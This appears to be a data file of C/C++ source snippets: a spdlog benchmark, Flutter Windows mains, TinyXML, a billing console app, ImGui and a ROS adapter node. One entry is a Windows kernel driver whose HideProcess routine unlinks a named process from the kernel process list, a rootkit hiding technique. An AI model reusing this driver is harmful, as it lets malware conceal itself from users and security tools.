->UseRealTime();\n    spdlog::drop(\"/dev/null_st\");\n\n    auto dev_null_mt = spdlog::basic_logger_mt(\"/dev/null_mt\", \"/dev/null\");\n    benchmark::RegisterBenchmark(\"/dev/null_mt\", bench_logger, std::move(dev_null_mt))\n        ->UseRealTime();\n    spdlog::drop(\"/dev/null_mt\");\n}\n#endif  // __linux__\n\nint main(int argc, char *argv[]) {\n    using spdlog::sinks::null_sink_mt;\n    using spdlog::sinks::null_sink_st;\n\n    size_t file_size = 30 * 1024 * 1024;\n    size_t rotating_files = 5;\n    int n_threads = benchmark::CPUInfo::Get().num_cpus;\n\n    auto full_bench = argc > 1 && std::string(argv[1]) == \"full\";\n\n    // disabled loggers\n    auto disabled_logger =\n        std::make_shared<spdlog::logger>(\"bench\", std::make_shared<null_sink_mt>());\n    disabled_logger->set_level(spdlog::level::off);\n    benchmark::RegisterBenchmark(\"disabled-at-compile-time\", bench_disabled_macro, disabled_logger);\n    benchmark::RegisterBenchmark(\"disabled-at-compile-time (global logger)\",\n                                 bench_disabled_macro_global_logger, disabled_logger);\n    benchmark::RegisterBenchmark(\"disabled-at-runtime\", bench_logger, disabled_logger);\n    benchmark::RegisterBenchmark(\"disabled-at-runtime (global logger)\", bench_global_logger,\n                                 disabled_logger);\n    // with backtrace of 64\n    auto tracing_disabled_logger =\n        std::make_shared<spdlog::logger>(\"bench\", std::make_shared<null_sink_mt>());\n    tracing_disabled_logger->enable_backtrace(64);\n    benchmark::RegisterBenchmark(\"disabled-at-runtime/backtrace\", bench_logger,\n                                 tracing_disabled_logger);\n\n    auto null_logger_st =\n        std::make_shared<spdlog::logger>(\"bench\", std::make_shared<null_sink_st>());\n    benchmark::RegisterBenchmark(\"null_sink_st (500_bytes c_str)\", bench_c_string,\n                                 std::move(null_logger_st));\n    benchmark::RegisterBenchmark(\"null_sink_st\", bench_logger, null_logger_st);\n    benchmark::RegisterBenchmark(\"null_sink_st (global logger)\", bench_global_logger,\n                                 null_logger_st);\n    // with backtrace of 64\n    auto tracing_null_logger_st =\n        std::make_shared<spdlog::logger>(\"bench\", std::make_shared<null_sink_st>());\n    tracing_null_logger_st->enable_ba",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"gpa_calculator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\nwww.sourceforge.net/projects/tinyxml\nOriginal code by Lee Thomason (www.grinninglizard.com)\n\nThis software is provided 'as-is', without any express or implied \nwarranty. In no event will the authors be held liable for any \ndamages arising from the use of this software.\n\nPermission is granted to anyone to use this software for any \npurpose, including commercial applications, and to alter it and \nredistribute it freely, subject to the following restrictions:\n\n1. The origin of this software must not be misrepresented; you must \nnot claim that you wrote the original software. If you use this\nsoftware in a product, an acknowledgment in the product documentation\nwould be appreciated but is not required.\n\n2. Altered source versions must be plainly marked as such, and \nmust not be misrepresented as being the original software.\n\n3. This notice may not be removed or altered from any source \ndistribution.\n*/\n\n#include <ctype.h>\n#include <stddef.h>\n\n#include \"tinyxml.h\"\n\n//#define DEBUG_PARSER\n#if defined( DEBUG_PARSER )\n#\tif defined( DEBUG ) && defined( _MSC_VER )\n#\t\tinclude <windows.h>\n#\t\tdefine TIXML_LOG OutputDebugString\n#\telse\n#\t\tdefine TIXML_LOG printf\n#\tendif\n#endif\n\n// Note tha \"PutString\" hardcodes the same list. This\n// is less flexible than it appears. Changing the entries\n// or order will break putstring.\t\nTiXmlBase::Entity TiXmlBase::entity[ TiXmlBase::NUM_ENTITY ] = \n{\n\t{ \"&amp;\",  5, '&' },\n\t{ \"&lt;\",   4, '<' },\n\t{ \"&gt;\",   4, '>' },\n\t{ \"&quot;\", 6, '\\\"' },\n\t{ \"&apos;\", 6, '\\'' }\n};\n\n// Bunch of unicode info at:\n//\t\thttp://www.unicode.org/faq/utf_bom.html\n// Including the basic of this table, which determines the #bytes in the\n// sequence from the lead byte. 1 placed for invalid sequences --\n// although the result will be junk, pass it through as much as possible.\n// Beware of the non-characters in UTF-8:\t\n//\t\t\t\tef bb bf (Microsoft \"lead bytes\")\n//\t\t\t\tef bf be\n//\t\t\t\tef bf bf \n\nconst unsigned char TIXML_UTF_LEAD_0 = 0xefU;\nconst unsigned char TIXML_UTF_LEAD_1 = 0xbbU;\nconst unsigned char TIXML_UTF_LEAD_2 = 0xbfU;\n\nconst int TiXmlBase::utf8ByteTable[256] = \n{\n\t//\t0\t1\t2\t3\t4\t5\t6\t7\t8\t9\ta\tb\tc\td\te\tf\n\t\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t// 0x00\n\t\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t// 0x10\n\t\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t// 0x20\n\t\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t// 0x30\n\t\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t// 0x40\n\t\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t// 0x50\n\t\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t// 0x60\n\t\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t// 0x70\tEnd of ASCII range\n\t\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t// 0x80 0x80 to 0xc1 invalid\n\t\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t// 0x90 \n\t\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t// 0xa0 \n\t\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t// 0xb0 \n\t\t1,\t1,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t// 0xc0 0xc2 to 0xdf 2 byte\n\t\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t2,\t// 0xd0\n\t\t3,\t3,\t3,\t3,\t3,\t3,\t3,\t3,\t3,\t3,\t3,\t3,\t3,\t3,\t3,\t3,\t// 0xe0 0xe0 to 0xef 3 byte\n\t\t4,\t4,\t4,\t4,\t4,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1,\t1\t// 0xf0 0xf0 to 0xf4 4 byte, 0xf5 and higher invalid\n};\n\n\nvoid TiXmlBase::ConvertUTF32ToUTF8( unsigned long input, char* output, int* length )\n{\n\tconst unsigned long BYTE_MASK = 0xBF;\n\tconst unsigned long BYTE_MARK = 0x80;\n\tconst unsigned long FIRST_BYTE_MARK[7] = { 0x00, 0x00, 0xC0, 0xE0, 0xF0, 0xF8, 0xFC };\n\n\tif (input < 0x80) \n\t\t*length = 1;\n\telse if ( input < 0x800 )\n\t\t*length = 2;\n\telse if ( input < 0x10000 )\n\t\t*length = 3;\n\telse if ( input < 0x200000 )\n\t\t*length = 4;\n\telse\n\t\t{ *length = 0; return; }\t// This code won't covert this correctly anyway.\n\n\toutput += *length;\n\n\t// Scary scary fall throughs.\n\tswitch (*length) \n\t{\n\t\tcase 4:\n\t\t\t--output; \n\t\t\t*output = (char)((input | BYTE_MARK) & BYTE_MASK); \n\t\t\tinput >>= 6;\n\t\tcase 3:\n\t\t\t--output; \n\t\t\t*output = (char)((input | BYTE_MARK) & BYTE_MASK); \n\t\t\tinput >>= 6;\n\t\tcase 2:\n\t\t\t--output; \n\t\t\t*output = (char)((input | BYTE_MARK) & BYTE_MASK); \n\t\t\tinput >>= 6;\n\t\tcase 1:\n\t\t\t--output; \n\t\t\t*output = (char)(input | FIRST_BYTE_MARK[*length]);\n\t}\n}\n\n\n/*static*/ int TiXmlBase::IsAlpha( unsigned char anyByte, TiXmlEncoding /*encoding*/ )\n{\n\t// This will only work for low-ascii, everything else is assumed to be a valid\n\t// letter. I'm not sure this is the best approach, but it is quite tricky trying\n\t// to figure out alhabetical vs. not across encoding. So take a very \n\t// conservative approach.\n\n//\tif ( encoding == TIXML_ENCODING_UTF8 )\n//\t{\n\t\tif ( anyByte < 127 )\n\t\t\treturn isalpha( anyByte );\n\t\telse\n\t\t\treturn 1;\t// What else to do? The unicode set is huge...get the english ones right.\n//\t}\n//\telse\n//\t{\n//\t\treturn isalpha( anyByte );\n//\t}\n}\n\n\n/*static*/ int TiXmlBase::IsAlphaNum( unsigned char anyByte, TiXmlEncoding /*encoding*/ )\n{\n\t// This will only work for low-ascii, everything else is assumed to be a valid\n\t// letter. I'm not sure this is the best approach, but it is quite tricky tryin",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <windows.h>\nusing namespace std;\n\nclass Bill{\nprivate:\n string Item;\n int Rate, Quantity;\npublic:\n Bill():Item(\"\"), Rate(0), Quantity(0){ }\n \n void setItem(string item){\n Item = item;\n }\n \nvoid setRate(int rate){\n Rate = rate;\n}\n\nvoid setQuant(int quant){\n Quantity = quant;\n}\n\nstring getItem(){\nreturn Item;\n}\n\nint getRate(){\n return Rate;\n}\n\nint getQuant(){\n return Quantity;\n}\n\n};\n\naddItem(Bill b){\nbool close = false;\nwhile(!close){\n\tint choice;\ncout<<\"\\t1.Add.\"<<endl;\ncout<<\"\\t2.close.\"<<endl;\ncout<<\"\\tEnter Choice: \";\ncin>>choice;\n\nif(choice==1){\n\tsystem(\"cls\");\nstring item;\nint rate, quant;\n\ncout<<\"\\tEnter Item Name: \";\ncin>>item;\nb.setItem(item);\n\ncout<<\"\\tEnter Rate Of Item: \";\ncin>>rate;\nb.setRate(rate);\n\ncout<<\"\\tEnter Quantity Of Item: \";\ncin>>quant;\nb.setQuant(quant);\n\nofstream out(\"D:/Bill.txt\", ios::app);\nif(!out){\n\tcout<<\"\\tError: File Can't Open!\"<<endl;\n}\nelse{\nout<<\"\\t\"<<b.getItem()<<\" : \"<<b.getRate()<<\" : \"<<b.getQuant()<<endl<<endl;\n}\nout.close();\ncout<<\"\\tItem Added Successfuly\"<<endl;\nSleep(3000);\n}\n\nelse if(choice == 2){\n\tsystem(\"cls\");\nclose = true;\ncout<<\"\\tBack To Main Menu!\"<<endl;\nSleep(3000);\n}\n}\n}\n\nprintBill(){\n\tsystem(\"cls\");\nint count = 0;\nbool close = false;\nwhile(!close){\nsystem(\"cls\");\nint choice;\ncout<<\"\\t1.Add Bill.\"<<endl;\ncout<<\"\\t2.Close Session.\"<<endl;\ncout<<\"\\tEnter Choice: \";\ncin>>choice;\n\nif(choice==1){\nstring item;\nint quant;\ncout<<\"\\tEnter Item: \";\ncin>>item;\ncout<<\"\\tEnter Quantity: \";\ncin>>quant;\n\nifstream in(\"D:/Bill.txt\");\nofstream out(\"D:/Bill Temp.txt\");\n\nstring line;\nbool found = false;\n\nwhile(getline(in, line)){\nstringstream ss;\nss<<line;\nstring itemName;\nint itemRate, itemQuant;\nchar delimiter;\nss>>itemName>>delimiter>>itemRate>>delimiter>>itemQuant;\n\nif(item ==itemName){\nfound = true;\nif(quant <= itemQuant){\nint amount = itemRate * quant;\ncout<<\"\\t Item | Rate | Quantity | Amount\"<<endl;\ncout<<\"\\t\"<<itemName<<\"\\t \"<<itemRate<<\"\\t \"<<quant<<\"\\t \"<<amount<<endl;\nint newQuant = itemQuant - quant;\nitemQuant = newQuant;\ncount +=amount;\n\nout<<\"\\t\"<<itemName<<\" : \"<<itemRate<<\" : \"<<itemQuant<<endl;\n}\nelse{\ncout<<\"\\tSorry, \"<<item<<\" Ended!\"<<endl;\n}\n}\nelse{\nout<<line<<endl;\n}\t\n}\nif(!found){\ncout<<\"\\tItem Not Available!\"<<endl;\n}\nout.close();\nin.close();\nremove(\"D:/Bill.txt\");\nrename(\"D:/Bill Temp.txt\", \"D:/Bill.txt\");\n}\nelse if(choice ==2){\nclose = true;\ncout<<\"\\tCounting Total Bill\"<<endl;\n}\nSleep(3000);\n}\nsystem(\"cls\");\ncout<<endl<<endl;\ncout<<\"\\t Total Bill ----------------- : \"<<count<<endl<<endl;\ncout<<\"\\tThanks For Shopping!\"<<endl;\nSleep(5000);\n}\n\nint main(){\nBill b;\n\nbool exit = false;\nwhile(!exit){\nsystem(\"cls\");\nint val;\n\ncout<<\"\\tWelcome To Super Market Billing System\"<<endl;\ncout<<\"\\t**************************************\"<<endl;\ncout<<\"\\t\\t1.Add Item.\"<<endl;\ncout<<\"\\t\\t2.Print Bill.\"<<endl;\ncout<<\"\\t\\t3.Exit.\"<<endl;\ncout<<\"\\t\\tEnter Choice: \";\ncin>>val;\n\nif(val==1){\nsystem(\"cls\");\naddItem(b);\t\nSleep(3000);\n}\n\nelse if(val==2){\nprintBill();\n}\n\nelse if(val==3){\n\tsystem(\"cls\");\nexit = true;\ncout<<\"\\tGood Luck!\"<<endl;\nSleep(3000);\n}\t\n}\n}\n",
    "#include <ntddk.h>\r\n#include <ntstrsafe.h>\r\n#include \"Offset.h\"\r\n\r\n#define IOCTL_GET_PROCESSNAME CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)\r\n\r\nNTSTATUS IrpCreateHandler(PDEVICE_OBJECT DeviceObject, PIRP Irp) {\r\n    UNREFERENCED_PARAMETER(DeviceObject);\r\n\r\n    // Complete the create request\r\n    Irp->IoStatus.Status = STATUS_SUCCESS;\r\n    Irp->IoStatus.Information = 0;\r\n    IoCompleteRequest(Irp, IO_NO_INCREMENT);\r\n\r\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"IRP_MJ_CREATE handled\\n\");\r\n    return STATUS_SUCCESS;\r\n}\r\n\r\nextern \"C\"\r\nstatic ULONG pidOffset = 0, nameOffset = 0, listEntryOffset = 0;\r\n\r\nextern \"C\"\r\nBOOLEAN InitializeOffsets()\r\n{\r\n    nameOffset = CalcProcessNameOffset();\r\n    pidOffset = CalcPIDOffset();\r\n    listEntryOffset = pidOffset + sizeof(HANDLE); // LIST_ENTRY\r\n\r\n    if (pidOffset == 0 || nameOffset == 0)\r\n        return FALSE;\r\n    else\r\n    {\r\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, \"NameOffset Address: 0x%X\\n\", nameOffset);\r\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, \"PID Address: 0x%X\\n\", pidOffset);\r\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, \"ListEntry Address: 0x%X\\n\", listEntryOffset);\r\n        return TRUE;\r\n    }\r\n}\r\n\r\nextern \"C\"\r\nVOID HideProcess(char* target)\r\n{\r\n    PLIST_ENTRY head, currentNode, prevNode;\r\n    PEPROCESS eprocessStart;\r\n    unsigned char* currentProcess = NULL;\r\n    //target = \"notepad.exe\"; // Change this name as needed\r\n    ANSI_STRING targetProcessName, currentProcessName;\r\n\r\n    eprocessStart = IoGetCurrentProcess();\r\n    head = currentNode = (PLIST_ENTRY)((unsigned char*)eprocessStart + listEntryOffset);\r\n    RtlInitAnsiString(&targetProcessName, target);\r\n\r\n    do\r\n    {\r\n        currentProcess = (unsigned char*)((unsigned char*)currentNode - listEntryOffset);\r\n        RtlInitAnsiString(&currentProcessName, (const char*)((unsigned char*)currentProcess + nameOffset));\r\n\r\n        // Compare process name\r\n        if (RtlCompareString(&targetProcessName, &currentProcessName, TRUE) == 0)\r\n        {\r\n            DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, \"Found target process %s.\\n\", target);\r\n\r\n            // Unlink the process from the list\r\n            prevNode = currentNode->Blink;\r\n            prevNode->Flink = currentNode->Flink;\r\n\r\n            currentNode->Flink->Blink = prevNode;\r\n\r\n            // Update pointers of the target process\r\n            currentNode->Flink = currentNode;\r\n            currentNode->Blink = currentNode;\r\n            break;\r\n        }\r\n\r\n        currentNode = currentNode->Flink;\r\n    } while (currentNode != head); // Corrects termination check\r\n}\r\n\r\nextern \"C\"\r\nULONG CalcPIDOffset()\r\n{\r\n    PEPROCESS peprocess = IoGetCurrentProcess();\r\n    HANDLE pid = PsGetCurrentProcessId();\r\n    PLIST_ENTRY list = NULL;\r\n    int i;\r\n\r\n    for (i = 0; i < PAGE_SIZE; i += sizeof(HANDLE))\r\n    {\r\n        if (*(PHANDLE)((PCHAR)peprocess + i) == pid)\r\n        {\r\n            // PLIST_ENTRY - PID\r\n            list = (PLIST_ENTRY)((unsigned char*)peprocess + i + sizeof(HANDLE));\r\n\r\n            if (MmIsAddressValid(list))\r\n            {\r\n                if (list == list->Flink->Blink)\r\n                {\r\n                    return i;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    return 0; // Returns 0 if the offset was not found\r\n}\r\n\r\nextern \"C\"\r\nULONG CalcProcessNameOffset()\r\n{\r\n    PEPROCESS ntosKrnl = PsInitialSystemProcess;\r\n    int i;\r\n\r\n    for (i = 0; i < PAGE_SIZE; i++)\r\n    {\r\n        if (RtlCompareMemory((PCHAR)ntosKrnl + i, \"System\", 6) == 6)\r\n        {\r\n            return i; // Returns the offset of the process name\r\n        }\r\n    }\r\n\r\n    return 0; // Returns 0 if the offset was not found\r\n}\r\n\r\nNTSTATUS DriverDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {\r\n    UNREFERENCED_PARAMETER(DeviceObject);\r\n\r\n    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);\r\n    ULONG bytes = 0;\r\n    NTSTATUS status = STATUS_SUCCESS;\r\n    char* inputBuffer = NULL;\r\n    ULONG inputBufferLength = stack->Parameters.DeviceIoControl.InputBufferLength;\r\n\r\n    switch (stack->Parameters.DeviceIoControl.IoControlCode) {\r\n    case IOCTL_GET_PROCESSNAME:\r\n        // Ensure the buffer size is valid\r\n        if (inputBufferLength == 0 || inputBufferLength > PAGE_SIZE) {\r\n            status = STATUS_INVALID_BUFFER_SIZE;\r\n            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"Invalid buffer size\\n\");\r\n            break;\r\n        }\r\n\r\n        // Ensure SystemBuffer is accessible\r\n        inputBuffer = (char*)Irp->AssociatedIrp.SystemBuffer;\r\n        if (inputBuffer == NULL) {\r\n            status = STATUS_INVALID_PARAMETER;\r\n            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"Invalid input buffer\\n\");\r\n            break;\r\n        }\r\n\r\n        // Ensure safe access to the buffer\r\n        __try {\r\n            DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, \"Received process name: %s\\n\", inputBuffer);\r\n\r\n            // Call HideProcess with the process name\r\n            HideProcess(inputBuffer);\r\n    ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// dear imgui, v1.67 WIP\n// (drawing and font code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] STB libraries implementation\n// [SECTION] Style functions\n// [SECTION] ImDrawList\n// [SECTION] ImDrawData\n// [SECTION] Helpers ShadeVertsXXX functions\n// [SECTION] ImFontConfig\n// [SECTION] ImFontAtlas\n// [SECTION] ImFontAtlas glyph ranges helpers + GlyphRangesBuilder\n// [SECTION] ImFont\n// [SECTION] Internal Render Helpers\n// [SECTION] Decompression code\n// [SECTION] Default font data (ProggyClean.ttf)\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n#include \"imgui_internal.h\"\n\n#include <stdio.h>      // vsnprintf, sscanf, printf\n#if !defined(alloca)\n#if defined(__GLIBC__) || defined(__sun) || defined(__CYGWIN__) || defined(__APPLE__)\n#include <alloca.h>     // alloca (glibc uses <alloca.h>. Note that Cygwin may have _WIN32 defined, so the order matters here)\n#elif defined(_WIN32)\n#include <malloc.h>     // alloca\n#if !defined(alloca)\n#define alloca _alloca  // for clang with MS Codegen\n#endif\n#else\n#include <stdlib.h>     // alloca\n#endif\n#endif\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4505) // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 4996) // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#endif\n\n// Clang/GCC warnings with -Weverything\n#ifdef __clang__\n#pragma clang diagnostic ignored \"-Wold-style-cast\"         // warning : use of old-style cast                              // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"            // warning : comparing floating point with == or != is unsafe   // storing and comparing against same constants ok.\n#pragma clang diagnostic ignored \"-Wglobal-constructors\"    // warning : declaration requires a global destructor           // similar to above, not sure what the exact difference it.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"        // warning : implicit conversion changes signedness             //\n#if __has_warning(\"-Wcomma\")\n#pragma clang diagnostic ignored \"-Wcomma\"                  // warning : possible misuse of comma operator here             //\n#endif\n#if __has_warning(\"-Wreserved-id-macro\")\n#pragma clang diagnostic ignored \"-Wreserved-id-macro\"      // warning : macro name is a reserved identifier                //\n#endif\n#if __has_warning(\"-Wdouble-promotion\")\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"       // warning: implicit conversion from 'float' to 'double' when passing argument to function\n#endif\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wunused-function\"          // warning: 'xxxx' defined but not used\n#pragma GCC diagnostic ignored \"-Wdouble-promotion\"         // warning: implicit conversion from 'float' to 'double' when passing argument to function\n#pragma GCC diagnostic ignored \"-Wconversion\"               // warning: conversion to 'xxxx' from 'xxxx' may alter its value\n#if __GNUC__ >= 8\n#pragma GCC diagnostic ignored \"-Wclass-memaccess\"          // warning: 'memset/memcpy' clearing/writing an object of type 'xxxx' with no trivial copy-assignment; use assignment or value-initialization instead\n#endif\n#endif\n\n//-------------------------------------------------------------------------\n// [SECTION] STB libraries implementation\n//-------------------------------------------------------------------------\n\n// Compile time options:\n//#define IMGUI_STB_NAMESPACE           ImGuiStb\n//#define IMGUI_STB_TRUETYPE_FILENAME   \"my_folder/stb_truetype.h\"\n//#define IMGUI_STB_RECT_PACK_FILENAME  \"my_folder/stb_rect_pack.h\"\n//#define IMGUI_DISABLE_STB_TRUETYPE_IMPLEMENTATION\n//#define IMGUI_DISABLE_STB_RECT_PACK_IMPLEMENTATION\n\n#ifdef IMGUI_STB_NAMESPACE\nnamespace IMGUI_STB_NAMESPACE\n{\n#endif\n\n#ifdef _MSC_VER\n#pragma warning (push)\n#pragma warning (disable: 4456)                             // declaration of 'xx' hides previous local declaration\n#endif\n\n#ifdef __clang__\n#pragma clang diagnostic push\n#pragma clang diagnostic ignored \"-Wunused-function\"\n#pragma clang diagnostic ignored \"-Wmissing-prototypes\"\n#pragma clang diagnostic ignored \"-Wimplicit-fallthrough\"\n#pragma clang diagnostic ignored \"-Wcast-qual\"              // warning : cast from 'const xxxx *' to 'xxx *' drops const qualifier //\n#endif\n\n#ifdef __GNUC__\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wtype-limits\"              // warning: comparison is always true due to limited range of data type [-Wtype-limits]\n#pragma GCC diagnostic ignored \"-Wcast-qual\"                // warning: cast from type 'const xxxx *' to type 'xxxx *' casts away qualifiers\n#endif\n\n#ifndef STB_RECT_PACK_IMPLEMENTATION                        // in case the user already have an implementation in the _same_ compilation unit (e.g. unity builds)\n#ifndef IMGUI_DISABLE_STB_RECT_PACK_IMPLEMENTAT",
    "/*\n * Copyright (C) 2024 LEIDOS.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License. You may obtain a copy of\n * the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n * License for the specific language governing permissions and limitations under\n * the License.\n*/\n\n\n#include \"mosaic_adapter.hpp\"\n#include \"mosaic_client.hpp\"\n#include <rapidjson/document.h>\n#include <rapidjson/istreamwrapper.h>\n#include <rapidjson/schema.h>\n#include <rapidjson/stringbuffer.h>\n#include <rapidjson/writer.h>\n\nMosaicAdapter::MosaicAdapter() : Node(\"mosaic_adapter\"), mosaic_client_() {\n\n    this->declare_parameter<std::string>(\"/vehicle_id\", \"default_vehicle_id\");\n    this->declare_parameter<std::string>(\"role_id\", \"msg_veh_1\");\n    this->declare_parameter<std::string>(\"cdasim_ip_address\", \"127.0.0.1\");\n    this->declare_parameter<std::string>(\"host_ip\", \"127.0.0.1\");\n    this->declare_parameter<bool>(\"enable_registration\", true);\n    this->declare_parameter<bool>(\"enable_vehicle_status\", true);\n    this->declare_parameter<int>(\"registration_port_local\", 4001);\n    this->declare_parameter<int>(\"vehicle_status_port_local\", 4002);\n    this->declare_parameter<int>(\"traffic_event_port_local\", 4003);\n    this->declare_parameter<int>(\"registration_port_remote\", 6001);\n    this->declare_parameter<int>(\"siren_and_light_status_port_remote\", 8001);\n\n    this->get_parameter(\"/vehicle_id\", config_.vehicle_id);\n    this->get_parameter(\"role_id\", config_.role_id);\n    this->get_parameter(\"cdasim_ip_address\", config_.cdasim_ip_address);\n    this->get_parameter(\"enable_registration\", config_.enable_registration);\n    this->get_parameter(\"enable_vehicle_status\", config_.enable_vehicle_status);\n    \n    int temp_port = 0;\n    this->get_parameter(\"registration_port_remote\", temp_port);\n    config_.registration_port_remote = static_cast<unsigned short>(temp_port);\n    this->get_parameter(\"registration_port_local\", temp_port);\n    config_.registration_port_local = static_cast<unsigned short>(temp_port);\n    this->get_parameter(\"vehicle_status_port_local\", temp_port);\n    config_.vehicle_status_port_local = static_cast<unsigned short>(temp_port);\n    this->get_parameter(\"siren_and_light_status_port_remote\", temp_port);\n    config_.siren_and_light_status_port_remote = static_cast<unsigned short>(temp_port);\n    this->get_parameter(\"traffic_event_port_local\", temp_port);\n    config_.traffic_event_port_local = static_cast<unsigned short>(temp_port);\n\n    // Log all configuration data\n    RCLCPP_INFO(this->get_logger(), \"MosaicAdapter Configuration:\");\n    RCLCPP_INFO(this->get_logger(), \" - vehicle_id: %s\", config_.vehicle_id.c_str());\n    RCLCPP_INFO(this->get_logger(), \" - role_id: %s\", config_.role_id.c_str());\n    RCLCPP_INFO(this->get_logger(), \" - cdasim_ip_address: %s\", config_.cdasim_ip_address.c_str());\n    RCLCPP_INFO(this->get_logger(), \" - messenger_ip_address: %s\", config_.messenger_ip_address.c_str());\n    RCLCPP_INFO(this->get_logger(), \" - enable_registration: %s\", config_.enable_registration ? \"true\" : \"false\");\n    RCLCPP_INFO(this->get_logger(), \" - enable_vehicle_status: 